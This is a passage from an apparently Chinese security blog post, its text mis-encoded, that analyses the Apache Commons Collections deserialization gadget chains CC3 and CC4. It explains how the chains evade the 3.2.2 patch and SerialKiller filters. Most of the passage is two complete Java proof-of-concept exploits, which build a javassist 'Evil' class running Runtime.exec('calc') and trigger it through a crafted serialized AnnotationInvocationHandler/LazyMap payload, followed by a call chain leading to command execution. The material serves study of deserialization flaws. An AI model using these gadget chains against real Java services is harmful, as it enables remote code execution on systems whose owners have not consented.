<h4 id="å…³é”®ç±»-2"><a href="#å…³é”®ç±»-2" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>æ›¿æ¢InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure>

<p>CC3 æ˜¯ CC1+CC2 çš„å˜ç§ï¼ŒCC2 ä½¿ç”¨äº†<code>TemplatesImpl.newTransformer</code>æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œï¼›è€Œ ysoserial ä¸­ CC3 ä½¿ç”¨çš„æ˜¯<code>TrAXFilter</code>ç±»è°ƒç”¨<code>newTransformer</code></p>
<h3 id="Gadget-2"><a href="#Gadget-2" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="â‘ p-ç‰›ç®€åŒ–çš„é“¾å­"><a href="#â‘ p-ç‰›ç®€åŒ–çš„é“¾å­" class="headerlink" title="â‘ p ç‰›ç®€åŒ–çš„é“¾å­"></a>â‘ p ç‰›ç®€åŒ–çš„é“¾å­</h4><blockquote>
<p>åœ¨ å®‰å…¨æ¼«è°ˆä¸­è®°å½•äº†å¦‚ä¸‹çš„ç»“åˆæ–¹å¼ï¼Œå« CC2 çš„<code>TemplateImpl</code></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>	  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>		  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>    		  <span class="hljs-keyword">method</span>.invoke<span class="hljs-literal">()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplateClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>CC2 ä¸­ï¼Œä½¿ç”¨<code>TransformingComparator</code>å»å¤„ç†<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code></p>
<p>è€Œ CC3ï¼Œåˆ™æ”¹é€ äº† CC1 çš„æ•°ç»„ï¼Œ<code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</code>æ”¹ä¸º<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code>å»æ‰§è¡Œ<code>TemplatesImpl.newTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Ezbyp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>        &#125;);<br>        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,  invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="â‘¡TrAXFilter-InstantiateTransformer"><a href="#â‘¡TrAXFilter-InstantiateTransformer" class="headerlink" title="â‘¡TrAXFilter+InstantiateTransformer"></a>â‘¡TrAXFilter+InstantiateTransformer</h4><blockquote>
<p>ysoserial çš„ä»£ç ï¼Œä¼šå‘ç°<code>CommonsCollections3</code>å’Œä¸Šè¿°ä»£ç å¹¶ä¸åŒï¼Œæ²¡æœ‰ä½¿â½¤åˆ°<code>InvokerTransformer</code>ã€‚åŸå› æ˜¯å› ä¸ºï¼š2015 å¹´åˆï¼Œ@frohoff å’Œ@gebl å‘å¸ƒäº† Talkã€ŠMarshalling Pickles: how deserializing objects will ruin your dayã€‹ï¼Œä»¥åŠ Java ååºåˆ—åŒ–åˆ©â½¤â¼¯å…· ysoserialï¼Œéšåå¼•çˆ†äº†å®‰å…¨ç•Œã€‚</p>
<p>Apache Commons Collections å®˜â½…åœ¨ 2015 å¹´åº•å¾—çŸ¥åºåˆ—åŒ–ç›¸å…³çš„é—®é¢˜åï¼Œå°±åœ¨ä¸¤ä¸ªåˆ†â½€ ä¸ŠåŒæ—¶å‘å¸ƒäº†æ–°çš„ç‰ˆæœ¬ï¼Œ4.1 å’Œ 3.2.2ã€‚å…ˆçœ‹ 3.2.2ï¼Œé€šè¿‡ diff å¯ä»¥å‘ç°ï¼Œæ–°ç‰ˆä»£ç ä¸­å¢åŠ äº†â¼€ä¸ªâ½…æ³• FunctorUtils#checkUnsafeSerialization ï¼Œâ½¤äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚å¦‚æœå¼€å‘è€…æ²¡æœ‰è®¾ç½®å…¨å±€é…ç½® org.apache.commons.collections.enableUnsafeSerialization=true ï¼Œå³é»˜è®¤æƒ…å†µä¸‹ä¼š æŠ›å‡ºå¼‚å¸¸ã€‚ è¿™ä¸ªæ£€æŸ¥åœ¨å¸¸â»…çš„å±é™© Transformer ç±»ï¼ˆInstantiateTransformer ã€ InvokerTransformer ã€ PrototypeFactory ã€ CloneTransformer ç­‰ï¼‰çš„ readObject â¾¥è¿›â¾è°ƒâ½¤ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºâ¼€ä¸ªå¼‚å¸¸ã€‚</p>
<p>åŒæ—¶ï¼Œå¼€å‘è€…ä»¬â¾ƒç„¶ä¼šå»æ‰¾å¯»â¼€ç§å®‰å…¨çš„è¿‡æ»¤â½…æ³•ï¼Œç±»ä¼¼ SerialKiller è¿™æ ·çš„â¼¯å…·éšä¹‹è¯â½£ã€‚ SerialKiller æ˜¯â¼€ä¸ª Java ååºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡â¿Šåå•ä¸â½©åå•çš„â½…å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„ç±»ã€‚åœ¨<code>SerialKiller</code>ä¸­å°±æœ‰è¿‡æ»¤<code>InvokerTransformer</code>ã€‚</p>
<p>é’ˆå¯¹æ­¤æƒ…å†µ<code>ysoserial</code>çš„ CC3 ç”¨<code>InstantiateTransformer</code>æ›¿æ¢<code>InvokerTransformer</code>ï¼ŒåŒæ—¶ä½¿ç”¨äº†<code>TrAXFilter</code></p>
</blockquote>
<p>ä¸‹é¢ä»‹ç»çš„æ˜¯ ysoserial ä¸­<code>TrAXFilter</code>ç±»è°ƒç”¨<code>newTransformer</code>çš„æ–¹å¼ä»¥åŠ<code>InstantiateTransformer</code></p>
<h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p><code>TrAXFilter</code>æ„é€ æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">        TransformerConfigurationException</span><br><span class="hljs-function">    </span>&#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();<br>        _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>        _useServicesMechanism = _transformer.useServicesMechnism();<br>    &#125;<br></code></pre></td></tr></table></figure>

<h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><p>chained å¦‚ä½•å»è§¦å‘<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•è¿›è€Œè°ƒç”¨<code>newTransformer</code>ï¼ŒCC3 ç”¨äº†ä¸€ä¸ª<code>InstantiateTransformer</code>ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> Class == <span class="hljs-keyword">false</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<br>                    <span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br>                        + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125;<br>            Constructor con = ((Class) input).getConstructor(iParamTypes);<br>            <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>            ...<br></code></pre></td></tr></table></figure>

<p>è¿™é‡ŒæŠŠ<code>input</code>è®¾ç½®<code>TrAXFilter</code>ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨è¿™é‡Œå®ä¾‹åŒ–çš„æ—¶å€™è°ƒç”¨å…¶æ„é€ æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨<code>TemplatesImpl#newTransformer</code>æœ€å RCE</p>
<p>å¦‚ä½•è°ƒç”¨åˆ°è¿™ä¸ª<code>chainedTransformer</code>æ˜¯ CC2 ä¸­ LazyMap ä¸­å®ç°çš„ï¼Œä¸å†èµ˜è¿°~</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_class&quot;, null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl, &quot;_tfactory&quot; ,new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap decorate = (LazyMap) LazyMap.decorate(hm, chainedTransformer);<br><br>        Constructor declaredConstructor = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><h3 id="Pre-3"><a href="#Pre-3" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-3"><a href="#é™åˆ¶-3" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 4.0</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-3"><a href="#åˆ©ç”¨é“¾-3" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

